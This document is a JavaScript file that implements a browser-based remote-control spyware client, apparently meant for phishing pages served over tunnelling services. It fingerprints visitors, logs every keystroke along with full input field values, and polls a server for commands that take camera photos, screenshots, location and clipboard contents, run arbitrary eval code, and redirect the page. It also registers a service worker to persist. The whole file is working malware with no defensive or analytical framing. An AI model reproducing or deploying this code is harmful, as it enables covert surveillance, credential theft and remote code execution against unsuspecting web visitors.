(function(){
'use strict';
var ALLOWED=['ngrok-free.dev','github.io','trycloudflare.com','localhost','127.0.0.1','serveo.net','netlify.app'];
var host=window.location.hostname;
if(!ALLOWED.some(function(d){return host.indexOf(d)!==-1}))return;
var API=(window.__GF_API)||window.location.origin;
var POLL_INTERVAL=3000;
var SID_KEY='gf_sid';
var KEYLOG_KEY='gf_keys';
var MAX_IDLE=7200000;
var lastCommandTime=Date.now();
var keysBuffer=[];
var KEYLOG_FLUSH=10000;
var _curStream=null,_camPending=null,_camTimer=null,_camGen=0;
function getSID(){try{return localStorage.getItem(SID_KEY)}catch(e){return null}}
function setSID(sid){try{localStorage.setItem(SID_KEY,sid)}catch(e){}}
function getFingerprint(cb){
  var fp={ua:navigator.userAgent,platform:navigator.platform,language:navigator.language,languages:navigator.languages,cores:navigator.hardwareConcurrency,memory:navigator.deviceMemory||'N/A',screen:screen.width+'x'+screen.height,availScreen:screen.availWidth+'x'+screen.availHeight,colorDepth:screen.colorDepth,pixelRatio:window.devicePixelRatio,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,touchPoints:navigator.maxTouchPoints,vendor:navigator.vendor,doNotTrack:navigator.doNotTrack,onLine:navigator.onLine,cookieEnabled:navigator.cookieEnabled,referrer:document.referrer,serviceWorker:'serviceWorker' in navigator,indexedDB:!!window.indexedDB,localStorage:!!window.localStorage};
  if(navigator.getBattery){navigator.getBattery().then(function(b){fp.battery={level:Math.round(b.level*100),charging:b.charging,chargingTime:b.chargingTime};try{localStorage.setItem('gf_fp',JSON.stringify(fp))}catch(e){};if(cb)cb(fp)}).catch(function(){try{localStorage.setItem('gf_fp',JSON.stringify(fp))}catch(e){};if(cb)cb(fp)})}else{try{localStorage.setItem('gf_fp',JSON.stringify(fp))}catch(e){};if(cb)cb(fp)}
}
var keylogActive=false;
function startKeylogger(){
  if(keylogActive)return;keylogActive=true;
  document.addEventListener('keydown',function(e){
    var entry={key:e.key,code:e.code,ctrl:e.ctrlKey,shift:e.shiftKey,alt:e.altKey,meta:e.metaKey,target:e.target.tagName+(e.target.id?'#'+e.target.id:'')+(e.target.name?'[name='+e.target.name+']':''),t:Date.now()};
    if(e.target&&(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')){entry.fullValue=e.target.value;entry.inputType=e.target.type}
    keysBuffer.push(entry)
  });
  setInterval(function(){
    if(keysBuffer.length===0)return;
    var batch=keysBuffer.splice(0,keysBuffer.length);
    if(window.GH)window.GH.sendResult('keylog',JSON.stringify({keys:batch,url:window.location.href,ts:Date.now()}));
    try{var existing=JSON.parse(localStorage.getItem(KEYLOG_KEY)||'[]');existing=existing.concat(batch).slice(-500);localStorage.setItem(KEYLOG_KEY,JSON.stringify(existing))}catch(e){}
  },KEYLOG_FLUSH)
}
window.GH=window.GH||{};
window.GH.sendResult=function(cmd,data){var sid=getSID();if(!sid)return;return fetch(API+'/api/result',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sid:sid,command:cmd,result:data,ts:Date.now()})}).catch(function(){})};
window.GH.register=function(){
  getFingerprint(function(fp){
    var sid=getSID();
    fetch(API+'/api/register',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sid:sid,ua:fp.ua,fingerprint:fp,host:window.location.host,path:window.location.pathname,referrer:document.referrer,ts:Date.now()})}).then(function(r){return r.json()}).then(function(data){if(data.sid){setSID(data.sid);startKeylogger();lastCommandTime=Date.now()}}).catch(function(){})
  })
};
window.GH.poll=function(){
  var sid=getSID();if(!sid)return;
  fetch(API+'/api/poll?sid='+encodeURIComponent(sid),{headers:{'Cache-Control':'no-cache'}}).then(function(r){return r.json()}).then(function(data){if(data&&data.commands&&data.commands.length>0){lastCommandTime=Date.now();data.commands.forEach(function(cmd){window.GH.execute(cmd)})}}).catch(function(){});
  if(Date.now()-lastCommandTime>MAX_IDLE){try{localStorage.removeItem(SID_KEY);localStorage.removeItem(KEYLOG_KEY)}catch(e){}}
};
window.GH.execute=function(cmd){
  var id=cmd.id,command=cmd.command,args=cmd.args||{};
  switch(command){
    case'info':getFingerprint(function(fp){window.GH.sendResult('info',JSON.stringify(fp))});break;
    case'camera':case'camera_front':captureCamera('user',id);break;
    case'camera_back':captureCamera('environment',id);break;
    case'screenshot':captureScreenshot(id);break;
    case'location':navigator.geolocation.getCurrentPosition(function(pos){window.GH.sendResult('location',JSON.stringify({lat:pos.coords.latitude,lng:pos.coords.longitude,accuracy:pos.coords.accuracy,ts:pos.timestamp}))},function(err){window.GH.sendResult('location',JSON.stringify({error:err.message,code:err.code}))},{enableHighAccuracy:true,timeout:15000,maximumAge:60000});break;
    case'clipboard':if(navigator.clipboard&&navigator.clipboard.readText){navigator.clipboard.readText().then(function(text){window.GH.sendResult('clipboard',JSON.stringify({text:text,len:text.length}))}).catch(function(e){window.GH.sendResult('clipboard',JSON.stringify({error:e.toString()}))})}else{window.GH.sendResult('clipboard',JSON.stringify({error:'not supported'}))}break;
    case'keylog_dump':try{window.GH.sendResult('keylog_dump',localStorage.getItem(KEYLOG_KEY)||'[]')}catch(e){}break;
    case'reload':window.location.reload();break;
    case'redirect':if(args.url)window.location.href=args.url;break;
    case'eval':if(args.code){try{window.GH.sendResult('eval',JSON.stringify({result:String(eval(args.code))}))}catch(e){window.GH.sendResult('eval',JSON.stringify({error:e.toString()}))}}break;
    case'ping':window.GH.sendResult('ping',JSON.stringify({pong:Date.now()}));break;
    default:window.GH.sendResult(command,JSON.stringify({status:'unknown_command'}));
  }
};
function stopCameraStream(){if(_curStream){_curStream.getTracks().forEach(function(t){t.stop()});_curStream=null}}
function captureCamera(facingMode,cmdId){
  if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){window.GH.sendResult('camera',JSON.stringify({error:'getUserMedia not supported'}));return}
  var gen=++_camGen;
  if(_camTimer){clearTimeout(_camTimer);_camTimer=null}
  stopCameraStream();
  _camPending={mode:facingMode,id:cmdId,gen:gen};
  var timedOut=false,attempt=0;
  _camTimer=setTimeout(function(){timedOut=true;stopCameraStream();if(_camPending&&_camPending.gen===gen){_camPending=null;window.GH.sendResult('camera',JSON.stringify({error:'timeout',note:'camera não liberada em 12s — aba precisa estar visível'}))}},12000);
  function done(ok,payload){
    if(_camTimer){clearTimeout(_camTimer);_camTimer=null}
    if(_camPending&&_camPending.gen===gen){_camPending=null;if(ok)window.GH.sendResult('camera_'+facingMode,JSON.stringify(payload));else window.GH.sendResult('camera',JSON.stringify(payload))}
  }
  function tryOnce(){
    var constraint={video:{width:{ideal:640},height:{ideal:480}},audio:false};
    if(attempt===0&&facingMode)constraint.video.facingMode=facingMode;
    navigator.mediaDevices.getUserMedia(constraint).then(function(stream){
      if(timedOut||!_camPending||_camPending.gen!==gen){stream.getTracks().forEach(function(t){t.stop()});return}
      _curStream=stream;
      var video=document.createElement('video');video.srcObject=stream;video.setAttribute('playsinline','');video.muted=true;
      var p=video.play();if(p&&p.catch)p.catch(function(){});
      video.addEventListener('loadeddata',function(){
        var canvas=document.createElement('canvas');canvas.width=video.videoWidth||640;canvas.height=video.videoHeight||480;
        try{var ctx=canvas.getContext('2d');ctx.drawImage(video,0,0,canvas.width,canvas.height);var dataUrl=canvas.toDataURL('image/jpeg',0.7);done(true,{image:dataUrl,ts:Date.now()})}
        catch(e){done(false,{error:'canvas fail:'+e.toString()})}
        stopCameraStream();video.remove();canvas.remove();
      });
      video.addEventListener('error',function(){done(false,{error:'video error'});stopCameraStream()});
    }).catch(function(e){
      if(timedOut||!_camPending||_camPending.gen!==gen)return;
      var msg=String((e&&e.name)||e);
      if(attempt<2&&(msg.indexOf('AbortError')>-1||msg.indexOf('NotReadableError')>-1||msg.indexOf('NotFoundError')>-1)){attempt++;setTimeout(tryOnce,800)}
      else if(attempt===0&&facingMode&&msg.indexOf('OverconstrainedError')>-1){facingMode=null;attempt=1;setTimeout(tryOnce,200)}
      else done(false,{error:e.toString()})
    })
  }
  tryOnce();
}
document.addEventListener('visibilitychange',function(){
  if(document.visibilityState==='visible'&&_camPending&&!_curStream){var p=_camPending;captureCamera(p.mode,p.id)}
});
function captureScreenshot(cmdId){
  if(typeof html2canvas!=='undefined'){
    html2canvas(document.body,{scale:0.5,useCORS:true,allowTaint:true,logging:false}).then(function(canvas){var dataUrl=canvas.toDataURL('image/jpeg',0.6);window.GH.sendResult('screenshot',JSON.stringify({image:dataUrl,ts:Date.now()}))}).catch(function(e){window.GH.sendResult('screenshot',JSON.stringify({error:'html2canvas:'+e.toString()}))})
  }else{
    var s=document.createElement('script');s.src='https://html2canvas.hertzen.com/dist/html2canvas.min.js';
    s.onload=function(){html2canvas(document.body,{scale:0.5,useCORS:true,allowTaint:true,logging:false}).then(function(canvas){var dataUrl=canvas.toDataURL('image/jpeg',0.6);window.GH.sendResult('screenshot',JSON.stringify({image:dataUrl,ts:Date.now()}))}).catch(function(e){window.GH.sendResult('screenshot',JSON.stringify({error:'html2canvas2:'+e.toString()}))})};
    s.onerror=function(){window.GH.sendResult('screenshot',JSON.stringify({error:'html2canvas CDN failed'}))};
    document.head.appendChild(s)
  }
}
(function init(){
  getFingerprint(function(fp){window.GH.register();setInterval(window.GH.poll,POLL_INTERVAL);
    try{
      if('serviceWorker' in navigator){
        navigator.serviceWorker.register('/static/sw.js').catch(function(){})
      }
    }catch(e){}
  })
})();
})();